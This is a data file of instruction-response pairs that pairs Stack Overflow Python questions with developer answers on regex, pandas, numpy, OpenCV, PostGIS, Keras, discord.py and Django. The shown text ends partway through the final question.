{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Python regex outputting multiple matches<p>I have the following example text:<\/p>\n<pre><code>60CC\n60 cc\n60cc2\n60CC(2)\n<\/code><\/pre>\n<p>and the following regex to match these instances:<\/p>\n<pre><code>(60\\s?(cc)(\\w|\\(.\\)){0,5})\n<\/code><\/pre>\n<p>however my output is as follows for the first match:<\/p>\n<pre><code>['60CC', 'CC', None]\n<\/code><\/pre>\n<p>(<a href=\"https:\/\/pythex.org\/?regex=(60%5Cs%3F(cc)(%5Cw%7C%5C(.%5C))%7B0%2C5%7D)&amp;test_string=60CC%0A60%20cc%0A60cc2%0A60CC(2)&amp;ignorecase=1&amp;multiline=0&amp;dotall=0&amp;verbose=0\" rel=\"nofollow noreferrer\">Demo of the sample regex &amp; data<\/a>.)<\/p>\n<p>how do I limit the output to just the first item?<\/p>\n<p>I am using Python Regex.\nthe snippet of my python code is:<\/p>\n<pre><code>re.findall(&quot;(60\\s?(cc)(\\w|\\(.\\)){0,5})&quot;, text, flags=re.IGNORECASE)\n<\/code><\/pre>","output_text":"<blockquote>\n  <p>how do I limit the output to just #1 ?<\/p>\n<\/blockquote>\n\n<p>You can just ignore the irrelevant groups from your findall\/finditer results.<\/p>\n\n<p>Alternatively, use <em>non-capturing<\/em> groups for the bits you don't care about: <a href=\"https:\/\/pythex.org\/?regex=(60%5Cs%3F(%3F%3Acc)(%3F%3A%5Cw%7C%5C(.%5C))%7B0%2C5%7D)&amp;test_string=60CC%0A60%20cc%0A60cc2%0A60CC(2)&amp;ignorecase=1&amp;multiline=0&amp;dotall=0&amp;verbose=0\" rel=\"nofollow noreferrer\">just add <code>?:<\/code> after the leading parenthesis<\/a>, this way you can still use grouping features (e.g. alternation) without the group being captured (split out) in the result.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Extract a part of a dictionnary file<p>Before saying I didn't search for an answer, I did and even if i'm not a Python expert, I didn't find any explicit answer.\nFor me to be clear, I'd like to extract 2 infos (&quot;name&quot; &amp; &quot;fame&quot;) from a specific &quot;clan&quot;.\nIn the json file extracted, the info are on [items] then in [0] and <a href=\"https:\/\/i.stack.imgur.com\/BUHKO.png\" rel=\"nofollow noreferrer\">1<\/a> and <a href=\"https:\/\/i.stack.imgur.com\/6kTSm.png\" rel=\"nofollow noreferrer\">2<\/a> and [3] and [4]. In this dictionnary on [standings]. Then, my issue is in the next dictionnary, it can be or in [0] or <a href=\"https:\/\/i.stack.imgur.com\/BUHKO.png\" rel=\"nofollow noreferrer\">1<\/a> or <a href=\"https:\/\/i.stack.imgur.com\/6kTSm.png\" rel=\"nofollow noreferrer\">2<\/a> or [3] or [4]. I don't know how to filter, for exemple by using something like &quot;filter with tag = #9VL9L9Y&quot;.\nHere is my code:<\/p>\n<pre><code>    data = json.loads(response)\n\n    for item in data [&quot;items&quot;]:\n        for p in item [&quot;standings&quot;]:\n                for q in p [&quot;clan&quot;][&quot;participants&quot;]:\n                    if (p[&quot;clan&quot;] = '#9VL9L9YQ'):\n                        print(&quot;%s %s&quot; % (\n                            q[&quot;name&quot;],\n                            q[&quot;fame&quot;],\n\n))\n<\/code><\/pre>\n<p>I know my line &quot;if (p[&quot;clan&quot;] = '#9VL9L9YQ'):&quot; is not correct but this is what i'd like to do.<\/p>\n<p>How the JSON file looks like:<\/p>\n<h2><a href=\"https:\/\/i.stack.imgur.com\/BUHKO.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/BUHKO.png\" alt=\"enter image description here\" \/><\/a><\/h2>\n<p><a href=\"https:\/\/i.stack.imgur.com\/6kTSm.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/6kTSm.png\" alt=\"enter image description here\" \/><\/a><\/p>\n<p>Thanks for your help !<\/p>","output_text":"<p>Reorder the logic a bit:<\/p>\n<pre><code>data = json.loads(response)\n\nfor item in data [&quot;items&quot;]:\n    for p in item [&quot;standings&quot;]:\n        clan = p[&quot;clan&quot;]\n        # check tag first:\n        if clan[&quot;tag&quot;] == '#9VL9L9YQ': # remove extraneous )\n            for q in clan[&quot;participants&quot;]:\n                print(&quot;%s %s&quot; % (q[&quot;name&quot;], [&quot;fame&quot;]))\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to turn a numpy vector into a matrix, where each column in the matrix contains a range around the respective element in the initial vector?<p>Say I have a numpy vector array:<\/p>\n<p><code>array([1, 2, 3])<\/code><\/p>\n<p>and I want to convert this vector into a matrix where each column takes a range of +\/- 2 around the respective element in the initial vector, such that my output matrix is:<\/p>\n<pre><code>array([[-1,  0,  1],\n       [ 0,  1,  2],\n       [ 1,  2,  3],\n       [ 2,  3,  4],\n       [ 3,  4,  5]])\n<\/code><\/pre>\n<p>what is the best (preferably vectorized) way to do this?<\/p>","output_text":"<p>You can do it with the following one-liner:<\/p>\n<pre><code>result = a + np.array([-1, 0, 1])[:, np.newaxis]\n<\/code><\/pre>\n<p>(I think, a more elegant solution).<\/p>\n<p>The result is:<\/p>\n<pre><code>array([[0, 1, 2],\n       [1, 2, 3],\n       [2, 3, 4]])\n<\/code><\/pre>\n<h1>Edit<\/h1>\n<p>If the range depends on some parameter, say <em>rng<\/em>, you can do it as:<\/p>\n<pre><code>rng = 2   # From x-2 to x+2\nresult = a + np.arange(-rng, rng + 1)[:, np.newaxis]\n<\/code><\/pre>\n<p>getting:<\/p>\n<pre><code>array([[-1,  0,  1],\n       [ 0,  1,  2],\n       [ 1,  2,  3],\n       [ 2,  3,  4],\n       [ 3,  4,  5]])\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Detection table as a surface gives a lot of rectangles<p>I want to get a rectangle of the surface of a table. So I thought I can do this with opencv with the findContours and contourArea function. Now when the result is when I take the max contourArea that it takes everything as an area. When I don't do that it gives a different result see pictures.<\/p>\n\n<p><a href=\"https:\/\/i.stack.imgur.com\/gye7R.jpg\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/gye7R.jpg\" alt=\"Green rectangle over the whole image\"><\/a><\/p>\n\n<p><a href=\"https:\/\/i.stack.imgur.com\/LZVT9.jpg\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/LZVT9.jpg\" alt=\"Rectangles everywhere\"><\/a><\/p>\n\n<p>Is there a way to combine the rectangles so that it detects the table as a surface? Because I want to know if those things are on the surface or are moved away from the surface.<\/p>\n\n<p>Code:<\/p>\n\n<pre><code>import cv2\nimport numpy as np\n\nfile = \"\/Users\/mars\/Downloads\/table.jpg\"\n\nim1 = cv2.imread(file, 0)\nim = cv2.imread(file)\n\nret, thresh_value = cv2.threshold(im1, 180, 255, cv2.THRESH_BINARY_INV)\n\nkernel = np.ones((5, 5), np.uint8)\ndilated_value = cv2.dilate(thresh_value, kernel, iterations=1)\n\ncontours, hierarchy = cv2.findContours(dilated_value, cv2.RETR_TREE, cv2.CHAIN_APPROX_SIMPLE)\n\nareas = [cv2.contourArea(c) for c in contours]\nmax_index = np.argmax(areas)\ncnt = contours[max_index]\nx, y, w, h = cv2.boundingRect(cnt)\ncv2.rectangle(im, (x, y), (x + w, y + h), (0, 255, 0), 2)\n\ncv2.imwrite('result.jpg', im)\n<\/code><\/pre>","output_text":"<p>The main reason your code is not working is because you are using <code>cv2.THRESH_BINARY_INV<\/code>.<br>\nInverting polarity, turns the table area to black color, and <code>findContours<\/code> is searching for white contours.  <\/p>\n\n<p>I suggest using the following stages:  <\/p>\n\n<ul>\n<li>Convert to binary image - use <code>THRESH_OTSU<\/code> for automatic threshold (it's more robust than using fixed threshold).  <\/li>\n<li>Use \"closing\" morphological operation (closing is like dilate and than erode).<br>\nclosing is better than <code>dilate<\/code>, because it doesn't change the size of the contour.<\/li>\n<li>Find contours, use <code>RETR_EXTERNAL<\/code> instead of <code>RETR_TREE<\/code>, because you are looking for the external contour.  <\/li>\n<li>Find contour with maximum area.  <\/li>\n<\/ul>\n\n<p>Here is the code:  <\/p>\n\n<pre><code>import numpy as np\nimport cv2\n\n# Read input image\nim = cv2.imread('table.jpg')\n\n# Drop one row and column from each side (because the image you posted has a green rectangle around it).\nim = im[1:-2, 1:-2, :]\n\n# Convert to Grayscale\nim1 = cv2.cvtColor(im, cv2.COLOR_BGR2GRAY)\n\n# Convert to binary image - use THRESH_OTSU for automatic threshold.\nret, thresh_value = cv2.threshold(im1, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)\n\n# Use \"closing\" morphological operation (closing is like dilate and than erode)\nthresh = cv2.morphologyEx(thresh_value, cv2.MORPH_CLOSE, np.ones((5, 5)))\n\ncnts = cv2.findContours(thresh, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_NONE)[-2]  # [-2] indexing is used due to OpenCV compatibility issues.\n\n# Get contour with maximum area\nc = max(cnts, key=cv2.contourArea)\n\n# Mark contour with green line\ncv2.drawContours(im, [c], -1, (0, 255, 0), 2)\n\n\n# Show output\ncv2.imshow('im', cv2.resize(im, (im.shape[1]\/\/4, im.shape[0]\/\/4)))\ncv2.waitKey(0)\ncv2.destroyAllWindows()\n<\/code><\/pre>\n\n<p>Result:<br>\n<a href=\"https:\/\/i.stack.imgur.com\/15nPa.jpg\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/15nPa.jpg\" alt=\"enter image description here\"><\/a><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n geometry is not recognized as parameter to Find_SRID<p>in the below posted code, i want to find the <code>SRID<\/code> of a geometry. i pass the geometry as a parameter.\nthe problem is when i run the code, i receive :<\/p>\n<pre><code>psycopg2.errors.SyntaxError: FEHLER:  Syntaxfehler bei \u00bb{\u00ab\nLINE 3:             Find_SRID({'coordinates': [[[747588.406469401...\n                             ^\n<\/code><\/pre>\n<p>as an attempt to fix it, i enclosed the <code>geometry<\/code> parameter between single qoutes as follows:<\/p>\n<pre><code>            ST_GeomFromJSON('{geometry}') As geomertySRID       \n<\/code><\/pre>\n<p>but then i receive the following error:<\/p>\n<pre><code>psycopg2.errors.SyntaxError: FEHLER:  Syntaxfehler bei \u00bbcoordinates\u00ab\nLINE 3:             Find_SRID('{'coordinates': [[[747588.40646940...\n                                ^\n<\/code><\/pre>\n<p>please let me know how to fix this error<\/p>\n<p><strong>code<\/strong>:<\/p>\n<pre><code>def executeForFindSRID(self,geometry):\n    print(geometry)        \n    query=&quot;&quot;&quot;\n    SELECT\n        ST_GeomFromGeoJSON({geometry}) As geomertySRID       \n    &quot;&quot;&quot;.format(geometry=geometry)\n    data = self.connection.query(query,[])\n    # print(data)        \n    return data\n\n    \n<\/code><\/pre>\n<p><strong>geometry<\/strong><\/p>\n<p>here is the geometry i would like to find its SRID`<\/p>\n<pre><code>DEBUG:root:responseParameters['treatmentAsJSONInEPSG25832']: {'coordinates': [[[747588.4064694013, 6643569.636689969], [747597.3898909885, 6643584.395168291], [747581.3480667257, 6643607.880399012], [747574.9313370206, 6643609.292079547], [747563.5095581454, 6643597.870300672], [747556.9644938463, 6643584.780172074], [747562.6112159868, 6643575.668415893], [747577.2413597145, 6643570.278362939], [747588.4064694013, 6643569.636689969]]], 'type': 'Polygon'}\n{'coordinates': [[[747588.4064694013, 6643569.636689969], [747597.3898909885, 6643584.395168291], [747581.3480667257, 6643607.880399012], [747574.9313370206, 6643609.292079547], [747563.5095581454, 6643597.870300672], [747556.9644938463, 6643584.780172074], [747562.6112159868, 6643575.668415893], [747577.2413597145, 6643570.278362939], [747588.4064694013, 6643569.636689969]]], 'type': 'Polygon'}\n<\/code><\/pre>","output_text":"<p>The function Find_SRID expects three parameters, namely the schema, the table name and the geometry column, e g.:<\/p>\n<pre><code>SELECT Find_SRID('public','mytable','geom');\n<\/code><\/pre>\n<p>You might also try the function <code>ST_SRID<\/code>, which extracts the SRS from a given geometry:<\/p>\n<pre><code>SELECT ST_SRID(geom) FROM mytable;\n<\/code><\/pre>\n<p>If your geometry has no SRS declared, the function <code>ST_SRID<\/code> will return zero, as there is no way that PostGIS can guess the SRS. Normally we assume that a geometry without explicit SRS is encoded as <a href=\"https:\/\/www.w3.org\/2015\/spatial\/wiki\/Coordinate_Reference_Systems#WGS84\" rel=\"nofollow noreferrer\"><code>WGS84<\/code><\/a> (EPSG:4326). As a matter of fact, <code>WGS84<\/code> is the expected SRS in the <a href=\"https:\/\/datatracker.ietf.org\/doc\/html\/rfc7946#section-4\" rel=\"nofollow noreferrer\"><code>GeoJSON Specification<\/code><\/a>:<\/p>\n<blockquote>\n<p>The coordinate reference system for all GeoJSON coordinates is a\ngeographic coordinate reference system, using the World Geodetic\nSystem 1984 (WGS 84) [WGS84] datum, with longitude and latitude units\nof decimal degrees.  This is equivalent to the coordinate reference\nsystem identified by the Open Geospatial Consortium (OGC) URN\nurn:ogc:def:crs:OGC::CRS84.<\/p>\n<\/blockquote>\n<p>Demo: <a href=\"https:\/\/dbfiddle.uk\/?rdbms=postgres_12&amp;fiddle=456fc167f1c9eab15110eb2f46f4ec92\" rel=\"nofollow noreferrer\"><code>db&lt;&gt;fiddle<\/code><\/a><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Find name of column which is non nan<p>I have a Dataframe defined like :<\/p>\n<pre><code>df1 = pd.DataFrame({&quot;col1&quot;:[1,np.nan,np.nan,np.nan,2,np.nan,np.nan,np.nan,np.nan],              \n                    &quot;col2&quot;:[np.nan,3,np.nan,4,np.nan,np.nan,np.nan,5,6], \n                    &quot;col3&quot;:[np.nan,np.nan,7,np.nan,np.nan,8,9,np.nan, np.nan]})\n<\/code><\/pre>\n<p>I want to transform it into a DataFrame like:<\/p>\n<pre><code>df2 = pd.DataFrame({&quot;col_name&quot;:['col1','col2','col3','col2','col1',\n                                'col3','col3','col2','col2'], \n                    &quot;value&quot;:[1,3,7,4,2,8,9,5,6]})\n<\/code><\/pre>\n<p>If possible, can we reverse this process too? By that I mean convert <code>df2<\/code> into <code>df1<\/code>.<\/p>\n<p>I don't want to go through the DataFrame iteratively as it becomes too computationally expensive.<\/p>","output_text":"<p>You can <code>stack<\/code> it:<\/p>\n<pre><code>out = (df1.stack().astype(int).droplevel(0)\n       .rename_axis('col_name').reset_index(name='value'))\n<\/code><\/pre>\n<p>Output:<\/p>\n<pre><code>  col_name  value\n0     col1      1\n1     col2      3\n2     col3      7\n3     col2      4\n4     col1      2\n5     col3      8\n6     col3      9\n7     col2      5\n8     col2      6\n<\/code><\/pre>\n<p>To go from <code>out<\/code> back to <code>df1<\/code>, you could <code>pivot<\/code>:<\/p>\n<pre><code>out1 = pd.pivot(out.reset_index(), 'index', 'col_name', 'value')\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Pivot Table with Groupby - Pandas<p>I'm trying to make a pivot table of data to look like the expected outcome below (second table) from the data in the first;<\/p>\n<pre><code>To Date         From    To    Quantity\n\n10\/11\/2020   USA   Ireland  5\n10\/11\/2020   USA   France   4\n11\/11\/2020   USA   France   6\n12\/11\/2020   USA   Jamaica  6\n12\/11\/2020   USA   France   5\n.\n.\n.\n14\/02\/2021   USA   Ireland  65\n<\/code><\/pre>\n<pre><code>           01\/11\/2020   01\/12\/2020   01\/01\/2021  01\/02\/2021\n\nIreland    15                                    65\nFrance     10\nJamaica    6\n\n<\/code><\/pre>\n<p>I can groupby() it to get the monthly figures..\nI would like the pivot table to have the total amount for each country..<\/p>\n<pre><code>df.index = qathist['To Date']\ndf.index = pd.to_datetime(df.index)\ndf_m= df.groupby(by=[df.index.year, df.index.month]).sum()\n\n<\/code><\/pre>\n<p>..but then I'm removing other data etc and can't seem to pivot it correctly!<\/p>\n<p>Any help much appreciated!!<\/p>","output_text":"<p>To get the monthly, it's better with <code>to_period<\/code>. An you can through <code>To<\/code> to groupby, then unstack:<\/p>\n<pre><code>df.groupby(['To',df.index.to_period('M')])['Quantity'].sum().unstack()\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n I want to see who clicked the button on Discord.py, how do I do?<p>I'm making a bot for my Discord server, and I'd like to see who clicks the button for a little project. Can anyone help me?<\/p>\n<pre><code>async def bottoni(ctx):\n    await buttons.send(\n        content = &quot;click!&quot;,\n        channel = ctx.channel.id,\n        components = [\n            ActionRow([\n                Button(\n                    label=&quot;first&quot;,\n                    style=ButtonType().Success,\n                    custom_id = &quot;button_one&quot;\n                ),\n                Button(\n                    label=&quot;second&quot;,\n                    style=ButtonType().Danger,\n                    custom_id = &quot;button_two&quot;\n                )\n            ])\n        ]\n    )\n\n@buttons.click\nasync def button_one(ctx):\n    interaction = buttons.click\n    print(interaction.author, &quot; clicked!&quot;)\n\n@buttons.click\nasync def button_two(ctx):\n    interaction = buttons.click\n    print(interaction.author, &quot; clicked!&quot;)\n<\/code><\/pre>","output_text":"<p>Reading the docs\n<a href=\"https:\/\/i.stack.imgur.com\/OXWYe.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/OXWYe.png\" alt=\"Docs\" \/><\/a><\/p>\n<p>So here is your code<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>sync def bottoni(ctx):\n    await buttons.send(\n        content = &quot;click!&quot;,\n        channel = ctx.channel.id,\n        components = [\n            ActionRow([\n                Button(\n                    label=&quot;first&quot;,\n                    style=ButtonType().Success,\n                    custom_id = &quot;button_one&quot;\n                ),\n                Button(\n                    label=&quot;second&quot;,\n                    style=ButtonType().Danger,\n                    custom_id = &quot;button_two&quot;\n                )\n            ])\n        ]\n    )\n\n@buttons.click\nasync def button_one(ctx):\n    interaction = buttons.click\n    print(f&quot;{ctx.member.name} just  clicked! button one&quot;)\n\n@buttons.click\nasync def button_two(ctx):\n    interaction = buttons.click\n    print(f&quot;{ctx.member.name} just  clicked! button two&quot;)\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to iterate through two dataframes create new one?<p>I'm working with the Asana Python API to pull a list of tasks and stories, which are returned as dictionary objects. There is a 1:many relationship between tasks and stories. I want to create a dataframe which has each story as one record, but with the addition of the parent task gid (unique identifier). This will let me join tasks and stories to build my report.<\/p>\n<p>I've created a nested loop which allows me to retrieve and print the stories associated with each task id. But rather than print the records, what I want is to build a new dataframe where each row has the parent task ID and one associated story. Nothing I've tried so far can produce that.<\/p>\n<pre><code># get dictionary with all tasks associated with project &amp; load into df\ntasks = client.tasks.find_by_project(&quot;project id&quot;)\ntasksDF = pd.DataFrame.from_dict(tasks, orient='columns')\n\n# iterate through task list and retrieve all associated stories\nfor ind in tasksDF.index:\n    print(tasksDF['gid'][ind])\n    storiesDF = pd.DataFrame.from_dict(client.stories.find_by_task(tasksDF['gid'][ind]))\n    for story in storiesDF.index:\n        print(storiesDF)\n<\/code><\/pre>\n<p>Edit: here is the format of the first input dataframe tasksDF:<\/p>\n<pre><code>   gid               name\n0  1202691502803495  Improve emails  for qualification,  post-order...\n1  1202691502803501  Focus on adopt-expand  suggestions  on website \n2  1202691502803507  Amplify  community member voices\n<\/code><\/pre>\n<p>Here is the format of the second input dataframe storiesDF:<\/p>\n<pre><code>   gid               created_at                       resource_type\n0  1202691619765536  2022-07-29T19:22:59.755Z         story\n1  1202691619854442  2022-07-29T19:23:06.663Z         story\n2  1202691619974673  2022-07-29T19:23:11.636Z         story\n3  1202691516738152  2022-07-29T19:24:09.938Z         story\n<\/code><\/pre>\n<p>So each record in tasksDF is the parent to one or more stories in storiesDF. I want to create a new dataframe which is the same as storiesDF, but with the addition of a column containing the matching parent gid from tasksDF.<\/p>\n<p>When I print using the code above, I get the elements I want (parent gid followed by multiple stories) but I can't figure out how to combine to build the dataframe I want.<\/p>\n<pre><code>1202691502803501\n                gid                created_at resource_type\n0  1202691619231667  2022-07-29T19:22:37.677Z         story\n1  1202691568061156  2022-07-29T19:22:49.486Z         story\n2  1202691516700419  2022-07-29T19:24:02.564Z         story\n3  1202824731913557  2022-08-18T22:20:03.991Z         story\n<\/code><\/pre>","output_text":"<p>As stated above, I can't merge (or join) two dataframes since they had no shared columns to join on. I thought about this some more and used pd.at to locate specific cell values, and pd.append to build the new dataframe inside the inner loop.<\/p>\n<pre><code># Get all the tasks for a given project and save to df\ntasks = client.tasks.find_by_project(&quot;12345678&quot;)\ntasksDF = pd.DataFrame.from_dict(tasks, orient='columns')\n\n# Create an empty dataframe to hold the stories\nreportDF = pd.DataFrame(columns={'TaskGID','TaskName','StoryGID','StoryAction','StoryText'})\n\n# Loop through the tasks, retrieving stories for each one\nfor task in tasksDF.index:\n#   first save this Task ID as a single variable\n    taskID = tasksDF.at[task,'gid']\n#   then pull all the stories for that task ID\n    storiesDF = pd.DataFrame.from_dict(client.stories.find_by_task(taskID))\n#   then loop through the stories, saving each one to the dataframe including the parent Task ID\n    for story in storiesDF.index:\n        reportDF = reportDF.append({'TaskGID':taskID, 'TaskName':tasksDF.at[task,'name'], 'StoryGID':storiesDF.at[story,'gid'], \\\n                'StoryAction':storiesDF.at[story,'resource_subtype'],'StoryText':storiesDF.at[story,'text'], 'Created':storiesDF.at[story,'created_at']}, \\\n                ignore_index=True)\n<\/code><\/pre>\n<p>Now I hold the taskID value while I find all the matching stories, then write out one record per story including the parent taskID.<\/p>\n<p>Probably neater ways to do this but it works for me. This is just the basic output showing the 'merge' - I added more fields in the code above:<\/p>\n<pre><code>            TaskGID          StoryGID\n0   1202691502803501  1202691619231667\n1   1202691502803501  1202691568061156\n2   1202691502803501  1202691516700419\n3   1202691502803501  1202824731913557\n4   1202691502803507  1202691569029125\n5   1202691502803507  1202691620978261\n6   1202691502803507  1202691569887538\n7   1202691502803507  1202824995319240\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Figure PNG file exported from Jupyter Notebook is empty<p>I am trying to export a PNG file containing a figure using matplotlib.pyplot in Jupyter Notebook, but it is empty. I have tried running <code>fig.savefig()<\/code> before <code>data.plot()<\/code>, but the exported PNG file is still empty. Please could you help me fix my code.<\/p>\n\n<p>My code cell in Jupyter Notebook:<\/p>\n\n<pre><code>fig = plt.gcf()\ndata = pd.read_csv('data\/gapminder_gdp_oceania.csv', index_col='country')\ndata.plot(kind='bar')\nfig.savefig('my_figure.png')\n<\/code><\/pre>","output_text":"<p><code>fig.savefig()<\/code> may not be as well suited as <code>plt.savefig()<\/code> for this particular use case - I might recommend using the latter. <\/p>\n\n<p>The reason being: if the source for <code>pandas.DataFrame.plot()<\/code> creates a new figure instance instead of using <code>plt.gcf()<\/code> (the documentation does not specify) then <code>fig.savefig()<\/code> won't work if <code>fig = plt.gcf()<\/code> <strong>precedes<\/strong> <code>data.plot()<\/code>, but <code>plt.savefig()<\/code> will.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n What to put in load model when there is custom objects as gradient reversal layer in Tensorflow (Domain Adaptation )<p>So, here is a sample code for the domain adaptation model, and all I want to do is to save the model and load it,<\/p>\n<pre><code>@tf.custom_gradient\ndef grad_reverse(x):\n    y = tf.identity(x)\n    def custom_grad(dy):\n        return -dy\n    return y, custom_grad\n\nclass GradReverse(tf.keras.layers.Layer):\n    def __init__(self):\n        super().__init__(name=&quot;grl&quot;)\n\n    def call(self, x):\n        return grad_reverse(x)\n\n\ndef get_adaptable_network(input_shape=x_source_train.shape[1:]):\n    \n    inputs = Input(shape=input_shape)\n    x = Conv2D(32, 5, padding='same', activation='relu', name='conv2d_1')(inputs)\n    x = MaxPool2D(pool_size=2, strides=2, name='max_pooling2d_1')(x)\n    x = Conv2D(48, 5, padding='same', activation='relu', name='conv2d_2')(x)\n    x = MaxPool2D(pool_size=2, strides=2, name='max_pooling2d_2')(x)\n    features = Flatten(name='flatten_1')(x)\n    x = Dense(100, activation='relu', name='dense_digits_1')(features)\n    x = Dense(100, activation='relu', name='dense_digits_2')(x)\n    digits_classifier = Dense(10, activation=&quot;softmax&quot;, name=&quot;digits_classifier&quot;)(x)\n\n    domain_branch = Dense(100, activation=&quot;relu&quot;, name=&quot;dense_domain&quot;)(GradReverse()(features))\n    domain_classifier = Dense(1, activation=&quot;sigmoid&quot;, name=&quot;domain_classifier&quot;)(domain_branch)\n\n    return Model(inputs=inputs, outputs=[digits_classifier, domain_classifier])\n\nmodel = get_adaptable_network()\nmodel.summary()\n\n# download the model in computer for later use\nmodel.save('DA_MNIST_to_MNIST_m.h5')\n\nfrom tensorflow import keras\nmodel = keras.models.load_model('DA_MNIST_to_MNIST_m.h5',custom_objects={'?':? })\n<\/code><\/pre>\n<p>I am not sure what to put on the custom_objects part, since there is a custom gradient reversal layer implemented for domain adaptation in tensorflow. When I do load the model, it gives an error:<\/p>\n<pre><code>\/usr\/local\/lib\/python3.7\/dist-packages\/tensorflow\/python\/keras\/utils\/generic_utils.py in class_and_config_for_serialized_keras_object(config, module_objects, custom_objects, printable_module_name)\n    294   cls = get_registered_object(class_name, custom_objects, module_objects)\n    295   if cls is None:\n--&gt; 296     raise ValueError('Unknown ' + printable_module_name + ': ' + class_name)\n    297 \n    298   cls_config = config['config']\n\nValueError: Unknown layer: GradReverse\n<\/code><\/pre>\n<p>I am doing MNIST to MNIST_M domain adaptation, and any help would be useful!<\/p>","output_text":"<p>I figured it out, I needed to change the GradReverse layer's init function with **kwargs, This object will then accept any other keyword argument that i haven't included.<\/p>\n<pre><code>class GradReverse(tf.keras.layers.Layer):\n    def __init__(self, **kwargs):\n        super().__init__(name=&quot;grl&quot;)\n\n    def call(self, x):\n        return grad_reverse(x)\n<\/code><\/pre>\n<p>In load model, we can use this,<\/p>\n<pre><code>from tensorflow import keras\nmodel = keras.models.load_model('DA_MNIST_to_MNIST_m.h5',custom_objects={'GradReverse':GradReverse})\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Find how many times changes maximum value in a list with reduce() (Python)<p>Using <code>reduce()<\/code> function, I have to find how many times the maximum value of a list changes.\nHere's my code, but I don't undestand why <code>count<\/code> remains to 0.<\/p>\n\n<pre><code>from functools import reduce\n\ncount = 0\n\nheights = [10, 8, 11, 2, 1, 4, 13, 11]\n\nreduce(lambda a, b: count + 1 if a &lt; b else count + 0, heights, 0)\n\nprint(count)\n<\/code><\/pre>","output_text":"<p>The way <code>reduce<\/code> works is as follows:<\/p>\n\n<ul>\n<li><p>Take the default value (last parameter) and the first element of the sequence, and apply the provided function. Here, we take <code>0<\/code> and <code>10<\/code>, and compute: <code>count + 1 if 0 &lt; 10 else count + 0<\/code>.<\/p><\/li>\n<li><p>Take the result from that operation, and apply the function to that and the second element, and so on.<\/p><\/li>\n<\/ul>\n\n<p>You can't expect to solve the problem this way, because none of this actually <em>reassigns<\/em> <code>count<\/code> - it stays equal to <code>0<\/code> no matter how many times this iterates. Each application of the <code>lambda<\/code> just produces either <code>0<\/code> or <code>1<\/code>. Also, these <code>0<\/code> and <code>1<\/code> values are carried forward to the next step, instead of remembering the previous maximum value.<\/p>\n\n<p><code>reduce<\/code> is <em>not the right tool for this job<\/em>, <em>but<\/em> you can force it to work by computing a tuple of (maximum value seen so far, count) at each step. (You need to actually use the value returned by <code>reduce<\/code>, and not have any external <code>count<\/code>.)<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Django filtering on a queryset not working<p>I am trying to add a filter on an existing queryset based on a condition but it doesn't work.<\/p>\n<p>This works<\/p>\n<pre><code>        queryset = None\n        if self.is_instructor == True:\n            queryset = Issue.objects.filter(type=self.type, type_id=self.type_id).filter(status__in=self.status)\n        else:    \n            queryset = Issue.objects.filter(type=self.type, type_id=self.type_id, created_by=self.created_by)\n<\/code><\/pre>\n<p>This doesn't<\/p>\n<pre><code>        queryset = None\n        if self.is_instructor == True:\n            queryset = Issue.objects.filter(type=self.type, type_id=self.type_id)\n        else:    \n            queryset = Issue.objects.filter(type=self.type, type_id=self.type_id, created_by=self.created_by)\n        \n        if len(self.status) &gt; 0:\n            queryset.filter(\n                    Q(status__in=self.status)\n                )\n\n        queryset.order_by('-created_on')\n<\/code><\/pre>\n<p>This is how my model looks like<\/p>\n<pre><code>STATUS_CHOICES = (\n    ('UNC', 'Unconfirmed'),\n    ('CNF', 'Confirmed'),\n    ('INP', 'In Progress'),\n    ('UAC', 'User Action Pending'),\n    ('RES', 'Resolved'),\n)\n\nclass Issue(models.Model):\n    UNCONFIRMED = 'UNC'\n\n    title = models.CharField(max_length=512, blank=False)\n    description = models.TextField(blank=False)\n\n    created_by = models.ForeignKey(User, on_delete=models.CASCADE, related_name='creator')\n    created_on = models.DateTimeField(auto_now_add=True)\n\n    status = models.CharField(\n        max_length=3,\n        choices=STATUS_CHOICES,\n        default=UNCONFIRMED\n    )\n<\/code><\/pre>\n<p>Assured, self.status holds the required data. I can't use get() because there are multiple records<\/p>\n<p>I have seen 